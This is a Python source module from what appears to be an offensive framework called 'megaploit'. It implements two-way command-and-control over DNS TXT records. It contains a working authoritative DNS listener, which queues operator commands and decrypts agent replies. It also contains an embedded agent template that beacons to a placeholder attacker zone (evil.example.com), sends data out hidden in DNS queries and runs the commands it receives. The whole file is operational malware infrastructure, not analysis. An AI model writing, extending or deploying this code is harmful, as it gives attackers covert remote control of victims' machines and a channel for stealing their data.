"""
megaploit.server.dns_listener
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Two-way C2 over DNS TXT records.

Architecture
------------
The agent encodes commands/responses as base64 chunks inside DNS TXT queries.
The server runs a minimal authoritative DNS server that answers TXT queries
for subdomains of the configured zone, extracts the payload, and replies with
encrypted command data in the TXT response.

Wire protocol
-------------
Query:  <session_token_hex>.<b64chunk_index>.<total_chunks>.<b64_payload>.c2.<zone>
        e.g.  ab12cd34.0.1.SGVsbG8gV29ybGQ.c2.evil.example.com

Answer: TXT response contains base64url-encoded encrypted command.

Operator usage
--------------
    listener add 5353 --dns --zone evil.example.com
    # Then delegate NS records for evil.example.com to your server

Agent generation
----------------
    generate --dns --lhost ns1.evil.example.com --zone evil.example.com

Security
--------
All payload data is AES-256-GCM encrypted with the shared key.  The session
token is derived as HMAC-SHA256(key, agent_nonce) — identical to the HTTP auth.
DNS data caps each label at 63 bytes and total query at 253 bytes per DNS spec.
"""

from __future__ import annotations

import base64
import json
import logging
import os
import queue
import socket
import struct
import threading
import time
from typing import Callable, Optional

from megaploit.core.config import AUDIT_LOG
from megaploit.server.session import Session

_LOG   = logging.getLogger("megaploit.dns_listener")
_SEQ   = struct.Struct("!Q")
_NONCE = 12

# ---------------------------------------------------------------------------
# Audit logger
# ---------------------------------------------------------------------------

def _setup_audit() -> logging.Logger:
    os.makedirs(os.path.dirname(AUDIT_LOG) or ".", exist_ok=True)
    lg = logging.getLogger("megaploit.dns_audit")
    if not lg.handlers:
        h = logging.FileHandler(AUDIT_LOG, encoding="utf-8")
        h.setFormatter(logging.Formatter("%(asctime)s UTC  %(message)s",
                                         datefmt="%Y-%m-%d %H:%M:%S"))
        lg.addHandler(h); lg.setLevel(logging.INFO)
    return lg

_audit = _setup_audit()

# ---------------------------------------------------------------------------
# AES-GCM — requires the 'cryptography' package (same rule as protocol.py)
# ---------------------------------------------------------------------------

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
except ImportError as _crypto_err:  # pragma: no cover
    raise ImportError(
        "The 'cryptography' package is required for AES-256-GCM transport.\n"
        "Install it with:  pip install cryptography\n"
        f"Original error: {_crypto_err}"
    ) from _crypto_err


def _encrypt(key: bytes, pt: bytes) -> bytes:
    nonce = os.urandom(_NONCE)
    return nonce + _AESGCM(key).encrypt(nonce, pt, None)


def _decrypt(key: bytes, data: bytes) -> bytes:
    nonce, ct_tag = data[:_NONCE], data[_NONCE:]
    return _AESGCM(key).decrypt(nonce, ct_tag, None)


# ---------------------------------------------------------------------------
# Minimal DNS packet parser / builder
# ---------------------------------------------------------------------------

def _parse_dns_query(data: bytes) -> dict | None:
    """
    Parse a DNS query packet.  Returns a dict with:
      txid, flags, qname (str), qtype, qclass
    or None on parse error.
    """
    try:
        if len(data) < 12:
            return None
        txid   = struct.unpack("!H", data[0:2])[0]
        flags  = struct.unpack("!H", data[2:4])[0]
        qdcount = struct.unpack("!H", data[4:6])[0]
        if qdcount == 0:
            return None

        # Walk the QNAME
        pos    = 12
        labels = []
        while pos < len(data):
            length = data[pos]
            pos += 1
            if length == 0:
                break
            if length > 63:
                return None  # compression pointer — not handled
            labels.append(data[pos:pos + length].decode("ascii", errors="ignore"))
            pos += length
        if pos + 3 >= len(data):
            return None
        qtype  = struct.unpack("!H", data[pos:pos + 2])[0]
        qclass = struct.unpack("!H", data[pos + 2:pos + 4])[0]
        return {"txid": txid, "flags": flags, "qname": ".".join(labels),
                "qtype": qtype, "qclass": qclass, "raw_query": data[:pos + 4]}
    except Exception:
        return None


def _build_txt_response(txid: int, qname: str, txt_value: str) -> bytes:
    """
    Build a minimal DNS TXT response packet.

    Returns the raw UDP payload.
    """
    # Header
    flags  = 0x8400   # QR=1 AA=1 RCODE=0
    header = struct.pack("!HHHHHH",
        txid, flags,
        1,     # QDCOUNT
        1,     # ANCOUNT
        0, 0   # NSCOUNT, ARCOUNT
    )

    # QNAME encoding
    def _encode_name(name: str) -> bytes:
        parts = name.rstrip(".").split(".")
        buf = b""
        for p in parts:
            enc = p.encode("ascii")
            buf += bytes([len(enc)]) + enc
        return buf + b"\x00"

    qname_bytes = _encode_name(qname)
    question    = qname_bytes + struct.pack("!HH", 16, 1)   # TYPE TXT, CLASS IN

    # Answer RR (NAME = pointer to QNAME in header → 0xC00C)
    txt_encoded = txt_value.encode("utf-8")
    # TXT RDATA: 1-byte length + string (max 255 per chunk; we chunk if needed)
    rdata_parts = [txt_encoded[i:i+255] for i in range(0, len(txt_encoded), 255)]
    rdata = b"".join(bytes([len(p)]) + p for p in rdata_parts)
    answer = (
        struct.pack("!H", 0xC00C) +       # NAME (pointer)
        struct.pack("!HH", 16, 1) +        # TYPE TXT, CLASS IN
        struct.pack("!I", 0) +             # TTL 0 (no caching)
        struct.pack("!H", len(rdata)) +    # RDLENGTH
        rdata
    )
    return header + question + answer


# ---------------------------------------------------------------------------
# Per-agent DNS state
# ---------------------------------------------------------------------------

class _DnsAgentState:
    def __init__(self, token: bytes, key: bytes) -> None:
        self.token       = token
        self.key         = key
        self.session:    Optional[Session] = None
        self.cmd_queue:  queue.Queue[str]  = queue.Queue(maxsize=32)
        self.resp_queue: queue.Queue[str]  = queue.Queue(maxsize=32)
        self.last_seen   = time.time()
        self.send_seq    = 0
        self.recv_seq    = -1
        self._lock       = threading.Lock()
        self._frag_buf:  dict[str, dict[int, bytes]] = {}  # nonce → {idx: chunk}

    def next_send_seq(self) -> int:
        with self._lock:
            self.send_seq += 1
            return self.send_seq

    def check_recv_seq(self, seq: int) -> bool:
        with self._lock:
            if seq > self.recv_seq:
                self.recv_seq = seq
                return True
            return False

    def encode_cmd(self, cmd: str) -> str:
        """Encode a command as base64url for a TXT response."""
        seq     = self.next_send_seq()
        plain   = _SEQ.pack(seq) + json.dumps(cmd).encode()
        cipher  = _encrypt(self.key, plain)
        return base64.urlsafe_b64encode(cipher).decode().rstrip("=")

    def add_fragment(self, nonce: str, idx: int, total: int, chunk: bytes) -> bytes | None:
        """Buffer a chunk; return assembled payload when all chunks arrive."""
        if nonce not in self._frag_buf:
            self._frag_buf[nonce] = {}
        self._frag_buf[nonce][idx] = chunk
        if len(self._frag_buf[nonce]) == total:
            assembled = b"".join(self._frag_buf.pop(nonce)[i] for i in range(total))
            return assembled
        return None

    def decode_payload(self, payload: bytes) -> str | None:
        try:
            plain = _decrypt(self.key, payload)
            seq   = _SEQ.unpack(plain[:8])[0]
            if not self.check_recv_seq(seq):
                return None
            return json.loads(plain[8:].decode("utf-8", errors="replace"))
        except Exception:
            return None


# ---------------------------------------------------------------------------
# DNS Listener
# ---------------------------------------------------------------------------

class DnsListener:
    """
    Authoritative DNS server for C2 via DNS TXT records.

    Query format parsed by this listener:
        <token_hex8>.<idx>.<total>.<nonce_b64>.<payload_b64_chunk>.c2.<zone>

    The <payload_b64_chunk> is the relevant chunk of the full base64url-encoded
    encrypted payload.  Multiple queries with the same nonce assemble into the
    full ciphertext.

    Parameters
    ----------
    bind_host   — IP to bind UDP socket (0.0.0.0 for all interfaces)
    port        — UDP port (default 53; use 5353 for non-root testing)
    zone        — authoritative zone, e.g. "c2.evil.example.com"
    secret_key  — shared key for HMAC auth + AES-GCM
    on_session  — callback(Session) when agent first checks in
    """

    def __init__(
        self,
        bind_host:  str,
        port:       int,
        zone:       str,
        secret_key: bytes,
        on_session: Callable[[Session], None],
    ) -> None:
        self.bind_host  = bind_host
        self.port       = port
        self.zone       = zone.lower().strip(".")
        self.secret_key = secret_key
        self.on_session = on_session

        self._agents:   dict[str, _DnsAgentState] = {}   # token_hex8 → state
        self._agents_lock = threading.Lock()
        self._session_counter = 0
        self._sock:   Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> None:
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.bind_host, self.port))
        self._running = True
        self._thread  = threading.Thread(
            target=self._recv_loop, daemon=True,
            name=f"megaploit.dns_listener:{self.port}",
        )
        self._thread.start()
        _audit.info("DNS_LISTEN  bind=%s:%d  zone=%s", self.bind_host, self.port, self.zone)

    def stop(self) -> None:
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        _audit.info("DNS_STOPPED  port=%d", self.port)

    # ------------------------------------------------------------------
    # Main receive loop
    # ------------------------------------------------------------------

    def _recv_loop(self) -> None:
        while self._running:
            try:
                data, addr = self._sock.recvfrom(512)
                threading.Thread(
                    target=self._handle,
                    args=(data, addr),
                    daemon=True,
                ).start()
            except OSError:
                break

    def _handle(self, data: bytes, addr: tuple) -> None:
        pkt = _parse_dns_query(data)
        if pkt is None or pkt["qtype"] != 16:   # 16 = TXT
            return

        qname = pkt["qname"].lower()
        # Strip the zone suffix
        suffix = f".c2.{self.zone}"
        if not qname.endswith(suffix):
            # Also accept direct c2.<zone> prefix
            suffix2 = f"c2.{self.zone}"
            if not qname.endswith(suffix2):
                return
            labels = qname[:-len(suffix2)].strip(".").split(".")
        else:
            labels = qname[:-len(suffix)].strip(".").split(".")

        # Expected labels: token_hex8 . idx . total . nonce . payload_chunk
        if len(labels) < 5:
            return

        token_hex, idx_s, total_s, nonce, *payload_parts = labels
        payload_chunk_b64 = "".join(payload_parts)

        try:
            idx   = int(idx_s)
            total = int(total_s)
        except ValueError:
            return

        try:
            chunk = base64.urlsafe_b64decode(payload_chunk_b64 + "==")
        except Exception:
            return

        # Look up or create agent state
        state = self._get_or_create(token_hex, addr[0])
        if state is None:
            return

        state.last_seen = time.time()

        # Assemble fragments
        assembled = state.add_fragment(nonce, idx, total, chunk)
        if assembled is None:
            # Not all chunks received yet — reply with empty TXT
            resp = _build_txt_response(pkt["txid"], pkt["qname"], ".")
            self._sock.sendto(resp, addr)
            return

        # Decrypt the assembled payload
        msg = state.decode_payload(assembled)
        if msg is None:
            return

        # Promote to session on first message
        if state.session is None:
            self._promote(token_hex, state, addr[0])

        # Store response
        if state.session and msg not in ("", "."):
            try:
                state.resp_queue.put_nowait(msg)
            except queue.Full:
                pass

        # Pull next command for this agent
        cmd = ""
        try:
            cmd = state.cmd_queue.get_nowait()
        except queue.Empty:
            pass

        txt_payload = state.encode_cmd(cmd) if cmd else "."
        resp = _build_txt_response(pkt["txid"], pkt["qname"], txt_payload)
        self._sock.sendto(resp, addr)

    # ------------------------------------------------------------------
    # Agent management
    # ------------------------------------------------------------------

    def _get_or_create(self, token_hex: str, ip: str) -> Optional[_DnsAgentState]:
        with self._agents_lock:
            if token_hex not in self._agents:
                # Derive key from token_hex (agents use first 8 hex chars as their ID)
                # The key stays the master secret key; token_hex is just the ID.
                state = _DnsAgentState(
                    token=bytes.fromhex(token_hex.zfill(16)),
                    key=self.secret_key[:32],
                )
                self._agents[token_hex] = state
                _audit.info("DNS_NEW_AGENT  ip=%-18s  token=%s", ip, token_hex)
            return self._agents[token_hex]

    def _promote(self, token_hex: str, state: _DnsAgentState, ip: str) -> None:
        with self._agents_lock:
            self._session_counter += 1
            sid = self._session_counter

        from megaploit.server.http_listener import _HttpSocketAdapter, _AgentState
        # Reuse the HTTP socket adapter with a compatible state
        http_state = _AgentState(token=state.token, key=state.key)
        http_state.cmd_queue  = state.cmd_queue
        http_state.resp_queue = state.resp_queue
        sock = _HttpSocketAdapter(http_state)
        session = Session(conn=sock, ip=ip, port=0, id=sid)
        state.session = session
        _audit.info("DNS_SESSION  ip=%-18s  session=%d", ip, sid)
        self.on_session(session)

    def __repr__(self) -> str:
        return f"<DnsListener udp://{self.bind_host}:{self.port}  zone={self.zone}>"


# ---------------------------------------------------------------------------
# DNS agent transport (embedded in generated agent.py when --dns is used)
# ---------------------------------------------------------------------------

_DNS_AGENT_TEMPLATE = '''\
# --- Megaploit DNS C2 Agent Transport ---
import base64, hashlib, hmac as _hmac, json, os, random, socket, struct, time

_NS    = "{ns_host}"
_ZONE  = "{zone}"
_KEY   = bytes.fromhex("{key_hex}")
_TOKEN = _hmac.new(_KEY, os.urandom(4), "sha256").digest()[:4].hex()
_SEQ_S = struct.Struct("!Q")
_NONCE = 12
_send_seq = 0
_recv_seq = -1

def _enc(key, pt):
    nonce = os.urandom(_NONCE)
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        ct = AESGCM(key).encrypt(nonce, pt, None)
    except ImportError:
        import hashlib as _hl
        stream = b"".join(_hl.sha256(key+nonce+i.to_bytes(8,"big")).digest()
                          for i in range((len(pt)+31)//32))
        ct = bytes(a^b for a,b in zip(pt,stream))+bytes(16)
    return nonce+ct

def _dec(key, data):
    nonce, ct_tag = data[:_NONCE], data[_NONCE:]
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(nonce, ct_tag, None)
    except ImportError:
        ct = ct_tag[:-16]
        import hashlib as _hl
        stream = b"".join(_hl.sha256(key+nonce+i.to_bytes(8,"big")).digest()
                          for i in range((len(ct)+31)//32))
        return bytes(a^b for a,b in zip(ct,stream))

def _dns_txt(qname):
    """Send a DNS TXT query and return the TXT string."""
    def _enc_name(n):
        buf = b""
        for p in n.rstrip(".").split("."):
            e = p.encode(); buf += bytes([len(e)])+e
        return buf+b"\\x00"
    txid = random.randint(1, 65535)
    pkt  = struct.pack("!HHHHHH",txid,0x0100,1,0,0,0) + _enc_name(qname) + struct.pack("!HH",16,1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    try:
        s.sendto(pkt, (_NS, 53))
        resp, _ = s.recvfrom(512)
    except Exception:
        return ""
    finally:
        s.close()
    # Parse TXT from answer section (skip header + question)
    try:
        ancount = struct.unpack("!H", resp[6:8])[0]
        if ancount == 0: return ""
        pos = 12
        # Skip question QNAME
        while pos < len(resp) and resp[pos] != 0: pos += 1+resp[pos] if resp[pos]<64 else 1
        pos += 5  # null + QTYPE(2) + QCLASS(2)
        # Skip answer NAME (pointer or label)
        if resp[pos] & 0xC0 == 0xC0: pos += 2
        else:
            while resp[pos]: pos += 1+resp[pos]; pos += 1
        pos += 10  # TYPE+CLASS+TTL+RDLEN skip (get RDLEN)
        rdlen = struct.unpack("!H", resp[pos-2:pos])[0]
        rdata = resp[pos:pos+rdlen]
        # TXT RDATA: len-prefixed strings
        txt = b""
        i = 0
        while i < len(rdata): slen=rdata[i]; txt+=rdata[i+1:i+1+slen]; i+=1+slen
        return txt.decode("utf-8","ignore")
    except Exception:
        return ""

def _send_payload(msg_str):
    global _send_seq
    _send_seq += 1
    pt     = _SEQ_S.pack(_send_seq) + json.dumps(msg_str).encode()
    cipher = _enc(_KEY, pt)
    b64    = base64.urlsafe_b64encode(cipher).decode().rstrip("=")
    # Split into 30-char DNS label chunks
    chunks = [b64[i:i+30] for i in range(0,len(b64),30)]
    total  = len(chunks)
    nonce  = os.urandom(3).hex()
    for idx, chunk in enumerate(chunks):
        qname = f"{_TOKEN}.{idx}.{total}.{nonce}.{chunk}.c2.{_ZONE}"
        _dns_txt(qname)  # side-effect: sends our data, ignores response except last
    # Last chunk gets the command back
    qname = f"{_TOKEN}.{total-1}.{total}.{nonce}.{chunks[-1]}.c2.{_ZONE}"
    return _dns_txt(qname)

def _recv_cmd(txt):
    global _recv_seq
    if not txt or txt == ".": return None
    try:
        ct    = base64.urlsafe_b64decode(txt+"==")
        pt    = _dec(_KEY, ct)
        seq   = _SEQ_S.unpack(pt[:8])[0]
        if seq <= _recv_seq: return None
        _recv_seq = seq
        return json.loads(pt[8:].decode())
    except Exception:
        return None

def run_dns_agent():
    from megaploit.agent.handlers import handle
    import megaploit.agent.meterp  # noqa
    last_resp = ""
    while True:
        try:
            txt = _send_payload(last_resp)
            last_resp = ""
            cmd = _recv_cmd(txt)
            if cmd is not None and cmd:
                if cmd == "exit": break
                result = handle(None, str(cmd))
                if result: last_resp = str(result)
            time.sleep(2)
        except Exception:
            time.sleep(10)
'''
